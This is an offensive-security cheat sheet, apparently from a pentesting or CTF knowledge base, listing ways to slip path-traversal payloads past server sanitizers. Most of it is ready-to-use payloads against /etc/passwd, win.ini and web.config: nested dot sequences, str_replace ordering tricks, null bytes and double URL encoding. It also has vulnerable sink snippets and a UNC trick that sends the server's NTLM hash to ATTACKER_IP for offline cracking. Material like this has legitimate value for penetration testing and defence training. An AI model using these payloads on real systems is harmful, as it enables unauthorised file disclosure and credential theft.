# Path Traversal — Filter Bypass Techniques

## When this applies

- Server applies a sanitizer (regex strip, str_replace, blocklist) before path use.
- Sanitizer is non-recursive or applies sequentially — leaves traversal after one pass.
- Goal: craft payload that survives the sanitizer.

## Technique

Combine nested sequences (non-recursive filter), sequential `str_replace` ordering exploits, null bytes, mixed separators, case variation, UNC, and wildcards. Each filter has a specific weakness.

## Steps

### Nested sequences (non-recursive filtering)

```
# Basic nesting
....//
..././
....\/

# Full payloads
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/windows/win.ini

# Why it works:
....// → remove ../ → ../
     ^^ filter removes this ^^
  ^^ this remains ^^
```

**Variations:**
```
...//...//...//etc/passwd
....\//....\//....\//etc/passwd
..../..../..../etc/passwd
.....////.....////.....////etc/passwd
```

### ASP.NET `Regex.Replace` forward-slash-only filter (Windows-specific)

When ASP.NET code does `Regex.Replace(filePath, "../", "")` (forward-slash only), the filter only handles forward-slash sequences and leaves backslash unfiltered. Windows file APIs accept both — bypass with `..\` directly:

```csharp
// Vulnerable handler:
var filePath = file.Value;
filePath = Regex.Replace(filePath, "../", "");
Response.TransmitFile(filePath);
```

**Bypass:** `..\web.config` (URL-encoded: `..%5Cweb.config`)

The filter regex only matches `../` (forward), so `..\web.config` survives untouched. Windows resolves it as parent-of-cwd access. Useful for IIS web.config / aspx source disclosure when the LFI handler is `Response.TransmitFile`.

Note: `Response.TransmitFile` enforces app-root scope on RELATIVE paths (one `..\` typically goes to site root, deeper `..\..\` is rejected at IIS). Absolute paths (`C:\...`) are allowed but read access is restricted to the IIS worker's identity.

For ASP.NET ViewState exploitation chain after web.config disclosure: see [`../deserialization/dotnet-deserialization.md`](../deserialization/dotnet-deserialization.md) ASP.NET ViewState section.

### Sequential `str_replace` array bypass (PHP-specific)

When PHP `str_replace()` takes an array of patterns, each is applied SEQUENTIALLY:

```php
// Common vulnerable pattern:
$path = str_replace(['../', './', '..\\', '.\\'], '', $input);
```

**Key bypass: `....\/`** (URL-encoded: `....%5C/`)
```
Step 1: remove '../'  → no match → ....\/
Step 2: remove './'   → no match → ....\/
Step 3: remove '..\' → MATCH → removes '..\\' from '....\\/' → result: ../
Step 4: remove '.\'   → no match → ../ SURVIVES
```

**Full payload:** `....%5C/....%5C/....%5C/....%5C/etc/passwd`

**Analysis approach:** For any `str_replace` array, trace each pattern's effect on your payload in order. Find combinations where removal by step N produces traversal that steps 1..N-1 already ran and steps N+1..end don't match.

### Null byte injection

```
# Basic null byte
../../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg

# Double-encoded null byte
../../../../etc/passwd%2500.png

# Multiple null bytes
../../../../etc/passwd%00%00.png

# Null byte with path
/var/www/images/../../../../etc/passwd%00.png
```

**Platform compatibility:**
```
PHP < 5.3.4:           Vulnerable
PHP >= 5.3.4:          Partially patched
Python 2.x:            Depends on API
Python 3.x:            Raises error
Java:                  Not vulnerable
Node.js:               Not vulnerable
C/C++ (file APIs):     Vulnerable
```

### Case sensitivity (Windows)

```
..\Windows\Win.ini
..\WINDOWS\WIN.INI
..\windows\win.ini
..\WiNdOwS\wIn.InI
```

### UNC path injection (Windows)

```
# Access via network share
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\win.ini

# Drive letter alternatives
\\?\C:\windows\win.ini
\\.\C:\windows\win.ini
```

### UNC NTLM hash leak via LFI (Windows web apps)

When the LFI/path parameter is consumed by Windows fopen/file_get_contents/include and the server is allowed outbound SMB, point the parameter at a UNC path on your attacker host. Windows will SMB-authenticate to your listener using the web-app process's identity (typically `IUSR`/`IIS APPPOOL\<pool>` for IIS, the configured Apache user for XAMPP/WAMP) — you receive a NetNTLMv2 hash, not the file contents.

```
?view=\\ATTACKER_IP\share\anything
?file=//ATTACKER_IP/share/anything       # forward slashes when \ is filtered
?path=\\ATTACKER_IP@80\file.txt          # WebDAV variant when SMB egress blocked
```

Filter bypass: many sanitizers blacklist `\` (backslash) but allow `/`. Windows accepts `//ATTACKER/share` as a valid UNC. If the app rejects URLs / schemes, plain UNC with forward slashes usually slips through. Capture with `impacket-smbserver` or `responder -I tun0`; crack `-m 5600` offline.

Outbound 445 is often firewalled; fall back to WebDAV (`\\ATTACKER_IP@80\path` or `\\ATTACKER_IP@SSL@443\path`) — same hash leak via HTTP/HTTPS PROPFIND.

### Wildcard bypass

```
# Using wildcards if shell execution involved
/etc/pass*
/etc/passwd?
/etc/[p]asswd
```

### Invalid character bypass

```
# Extra dots
..........//////etc/passwd
...../...../...../etc/passwd

# Random invalid characters (might bypass regex)
../!../!../etc/passwd
../.+../.+../etc/passwd
```

### URL encoding bypass (combined)

```
# Single encoding
..%2f..%2f..%2fetc/passwd

# Double encoding (bypass URL-decode filters)
..%252f..%252f..%252fetc/passwd

# Mixed encoding
..%2f..%252f../etc/passwd

# Full encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double full encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

> **Encode N times when traversing N URL-decoding hops.** When a path-traversal CVE in service A is reachable only via a SSRF-style proxy in service B (`/download?url=http://internal/.cpr/...`), the proxy URL-decodes the `url=` parameter once before fetching. Your `%2F` becomes literal `/` → service A sees `/.cpr//etc/passwd` (no traversal). Encode special chars TWICE — `%2F` → `%252F`. Proxy decodes once to `%2F`, fetches, service A decodes again to `/`, traversal lands. Recipe: count URL-decoding hops in the chain, encode special chars N times. For HTTP-via-SSRF chains, N=2 is the common case.

## Verifying success

- Payload reaches the file handler unsanitized — file content returned.
- Different bypass payloads each succeed against different filter configurations.
- Decoding/normalization in the response confirms the bypass took effect.

### ZIP-wrap LFI (download-as-archive endpoints)

Some "download.php" / "/download" endpoints are not direct readers — they take a filename, run `zip` (or build a ZIP archive in code), and stream the archive back. Symptoms:
- Response `Content-Type: application/zip`, `Content-Disposition: attachment; filename=*.zip`.
- A valid filename returns content; an invalid one returns size 0 (silent fail).
- A `....//` traversal that hits a valid file returns a small ZIP; the file you wanted lives inside, namespaced under whatever base directory the script `cd`s to (e.g. `press_package/etc/passwd`).

Always pipe suspicious responses through `unzip -p` before assuming the LFI failed:
```bash
curl -s -o /tmp/r.bin "$URL?file=....//....//....//....//etc/passwd"
file /tmp/r.bin            # → "Zip archive data"
unzip -p /tmp/r.bin        # → actual /etc/passwd content
```

The depth of `....//` repetitions must traverse from the script's CWD up to `/`. Probe with `....//`, `....//....//`, etc. until a non-empty ZIP comes back. (HTB Snoopy `/download.php?file=....//....//....//....//etc/passwd` — 4 levels needed; the missing dir is silently swallowed by the filter, so use 1-2 extra `....//` for safety.)

## `os.path.join` / `pathlib` absolute-component bypass

When a Python handler builds a path with `os.path.join(BASE, user_input)` (or `pathlib.Path(BASE) / user_input`), an attacker-supplied **absolute** path discards every preceding component. `os.path.join('/var/www/uploads', '/etc/passwd')` returns `/etc/passwd`. `Path('/var/www') / '/etc/passwd'` returns `PosixPath('/etc/passwd')`.

Sink fingerprint:
```python
path = os.path.join(UPLOAD_DIR, request.form['filename'])  # or request.json[...], etc.
return send_file(path)                                     # or open(path), shutil.copy, ...
```

Detection: send a parameter starting with `/` (Linux) or `C:\\` / `\\` (Windows) and confirm the response reads from filesystem root, not from `BASE`. Different from `..` traversal — no parent-directory references at all, just an absolute path.

Mitigation: `os.path.realpath(joined).startswith(BASE)` or `os.path.commonpath([joined, BASE]) == BASE` — both correctly reject absolute and `..` traversal. Just normalising with `os.path.normpath` is NOT enough (it preserves the absolute path).

## Common pitfalls

- Modern sanitizers normalize Unicode/UTF-8 — those bypasses fail. Try sequential-replace exploits.
- Null-byte bypass is mostly limited to legacy PHP / C — useless against modern Java/Go/Python 3.
- Windows null-byte vs Linux null-byte behavior differs — test both.
- `os.path.join` absolute-component bypass is silent — no exception, no error, just reads from filesystem root.

## Tools

- Burp Suite Intruder
- dotdotpwn
- ffuf
- Custom Python test scripts
